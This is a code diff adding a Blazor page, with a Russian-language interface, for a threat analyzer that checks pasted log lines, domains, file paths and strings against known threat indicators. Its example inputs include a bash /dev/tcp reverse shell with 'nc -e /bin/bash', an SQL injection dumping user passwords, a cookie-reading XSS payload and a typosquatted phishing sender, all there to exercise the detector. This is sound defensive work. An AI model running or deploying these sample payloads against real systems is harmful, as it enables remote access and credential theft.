@@ -1,0 +1,224 @@
+@page "/analyzer"
+@inject IThreatAnalyzerService AnalyzerService
+@using NetworkThreats.Models
+@using NetworkThreats.Services
+
+<PageTitle>Анализатор угроз</PageTitle>
+
+<div class="mb-4">
+    <h3 class="mb-1">Анализатор угроз</h3>
+    <p class="text-muted">Введите IP-адрес, домен, путь к файлу или строку из лога — система определит возможные угрозы.</p>
+</div>
+
+<div class="row">
+    <div class="col-lg-8">
+        <div class="card border-0 shadow-sm mb-3">
+            <div class="card-body">
+                <label class="form-label fw-semibold">Входные данные</label>
+                <textarea class="form-control font-monospace"
+                          rows="4"
+                          placeholder="Примеры:&#10;Failed password for root from 10.0.0.5 port 22&#10;GET /login?id=1' UNION SELECT * FROM users--&#10;&lt;script&gt;document.cookie&lt;/script&gt;&#10;C:\Users\Public\Temp\svchost.exe"
+                          @bind="input"></textarea>
+
+                <div class="mt-3 d-flex flex-wrap gap-2 align-items-center">
+                    <span class="text-muted small me-1">Примеры:</span>
+                    @foreach (var ex in examples)
+                    {
+                        <button class="btn btn-sm btn-outline-secondary" @onclick="() => UseExample(ex.Value)" title="@ex.Key">
+                            @ex.Key
+                        </button>
+                    }
+                </div>
+
+                <div class="mt-3">
+                    <button class="btn btn-primary px-4" @onclick="Analyze" disabled="@isLoading">
+                        @if (isLoading)
+                        {
+                            <span class="spinner-border spinner-border-sm me-2"></span>
+                        }
+                        <i class="bi bi-cpu me-2"></i>Анализировать
+                    </button>
+                    @if (result is not null)
+                    {
+                        <button class="btn btn-outline-secondary ms-2" @onclick="Clear">Очистить</button>
+                    }
+                </div>
+            </div>
+        </div>
+
+        @if (result is not null)
+        {
+            <!-- Итоговый вердикт -->
+            @if (!result.ThreatDetected)
+            {
+                <div class="alert border-0 shadow-sm d-flex align-items-center gap-3 py-3" style="background:#f0faf4; border-left:4px solid #28a745 !important;">
+                    <i class="bi bi-shield-check text-success fs-2"></i>
+                    <div>
+                        <div class="fw-semibold text-success">Угроз не обнаружено</div>
+                        <div class="text-muted small">Входные данные не содержат известных индикаторов угроз.</div>
+                    </div>
+                </div>
+            }
+            else
+            {
+                <div class="alert border-0 shadow-sm d-flex align-items-center gap-3 py-3 mb-3" style="background:#fff5f5; border-left:4px solid #dc3545 !important;">
+                    <i class="bi bi-shield-exclamation text-danger fs-2"></i>
+                    <div>
+                        <div class="fw-semibold text-danger">Обнаружены угрозы: @result.Matches.Count</div>
+                        <div class="text-muted small">Найдены совпадения с известными индикаторами угроз.</div>
+                    </div>
+                </div>
+
+                <!-- Карточки угроз -->
+                @foreach (var match in result.Matches)
+                {
+                    <div class="card border-0 shadow-sm mb-3">
+                        <div class="card-header d-flex justify-content-between align-items-center">
+                            <div class="d-flex align-items-center gap-2">
+                                <i class="bi bi-exclamation-triangle-fill @SeverityColor(match.Severity)"></i>
+                                <a href="/threats/@match.ThreatId" class="fw-semibold text-decoration-none link-dark">
+                                    @match.Name
+                                </a>
+                                <span class="badge @SeverityBadge(match.Severity)">@SeverityLabel(match.Severity)</span>
+                            </div>
+                            <div class="d-flex align-items-center gap-2">
+                                <small class="text-muted">@match.CategoryName</small>
+                                <span class="badge @ConfBadge(match.OverallConfidence)">
+                                    @ConfLabel(match.OverallConfidence)
+                                </span>
+                            </div>
+                        </div>
+                        <div class="card-body p-0">
+                            <table class="table table-sm mb-0">
+                                <thead>
+                                    <tr>
+                                        <th style="width:140px">Тип индикатора</th>
+                                        <th style="width:200px">Сработавший паттерн</th>
+                                        <th>Описание</th>
+                                        <th style="width:80px">Риск</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    @foreach (var hit in match.Indicators)
+                                    {
+                                        <tr>
+                                            <td><span class="badge bg-light text-dark border">@hit.Type</span></td>
+                                            <td><code class="small">@hit.Pattern</code></td>
+                                            <td class="text-muted small">@hit.Description</td>
+                                            <td><span class="badge @ConfBadge(hit.Confidence)">@ConfLabel(hit.Confidence)</span></td>
+                                        </tr>
+                                    }
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                }
+            }
+        }
+    </div>
+
+    <!-- Справка -->
+    <div class="col-lg-4">
+        <div class="card border-0 shadow-sm">
+            <div class="card-header"><i class="bi bi-info-circle me-2"></i>Что поддерживает анализатор</div>
+            <div class="card-body p-0">
+                <ul class="list-group list-group-flush">
+                    <li class="list-group-item">
+                        <div class="fw-semibold small">🔑 Ключевые слова</div>
+                        <div class="text-muted" style="font-size:0.8rem">Фразы из атак, команд, сообщений вредоносов</div>
+                    </li>
+                    <li class="list-group-item">
+                        <div class="fw-semibold small">📄 Строки логов</div>
+                        <div class="text-muted" style="font-size:0.8rem">Паттерны из syslog, auth.log, apache access.log</div>
+                    </li>
+                    <li class="list-group-item">
+                        <div class="fw-semibold small">📁 Пути к файлам</div>
+                        <div class="text-muted" style="font-size:0.8rem">Подозрительные расположения исполняемых файлов</div>
+                    </li>
+                    <li class="list-group-item">
+                        <div class="fw-semibold small">🌐 Домены</div>
+                        <div class="text-muted" style="font-size:0.8rem">Тайпсквоттинг, фишинговые домены</div>
+                    </li>
+                    <li class="list-group-item">
+                        <div class="fw-semibold small">💉 Инъекции</div>
+                        <div class="text-muted" style="font-size:0.8rem">SQL, XSS, command injection паттерны</div>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+@code {
+    private string input = "";
+    private AnalysisResultDto? result;
+    private bool isLoading;
+
+    private readonly Dictionary<string, string> examples = new()
+    {
+        ["Brute Force лог"]  = "May 20 03:14:22 sshd[1234]: Failed password for root from 10.0.0.5 port 22 ssh2",
+        ["SQL-инъекция"]     = "GET /login?id=1' UNION SELECT username,password FROM users--",
+        ["XSS"]              = "<img src=x onerror=document.cookie>",
+        ["Ransomware"]       = "C:\\Users\\Public\\Temp\\svchost.exe /silent YOUR_FILES_ARE_ENCRYPTED",
+        ["RAT / Reverse shell"] = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1  nc -e /bin/bash",
+        ["Сниффинг"]         = "kernel: eth0: entered promiscuous mode",
+        ["Фишинг"]           = "From: security@paypa1.com — verify your account urgent action required",
+    };
+
+    private async Task Analyze()
+    {
+        if (string.IsNullOrWhiteSpace(input)) return;
+        isLoading = true;
+        result = await AnalyzerService.AnalyzeAsync(input);
+        isLoading = false;
+    }
+
+    private void UseExample(string text)
+    {
+        input = text;
+        result = null;
+    }
+
+    private void Clear()
+    {
+        input = "";
+        result = null;
+    }
+
+    private static string SeverityBadge(string s) => s switch
+    {
+        "critical" => "bg-danger",
+        "high"     => "bg-warning text-dark",
+        "medium"   => "bg-info text-dark",
+        _          => "bg-secondary"
+    };
+
+    private static string SeverityColor(string s) => s switch
+    {
+        "critical" => "text-danger",
+        "high"     => "text-warning",
+        _          => "text-secondary"
+    };
+
+    private static string SeverityLabel(string s) => s switch
+    {
+        "critical" => "Критический",
+        "high"     => "Высокий",
+        "medium"   => "Средний",
+        _          => "Низкий"
+    };
+
+    private static string ConfBadge(string c) => c switch
+    {
+        "high"   => "bg-danger",
+        "medium" => "bg-warning text-dark",
+        _        => "bg-secondary"
+    };
+
+    private static string ConfLabel(string c) => c switch
+    {
+        "high"   => "Высокий риск",
+        "medium" => "Средний риск",
+        _        => "Низкий риск"
+    };
+}
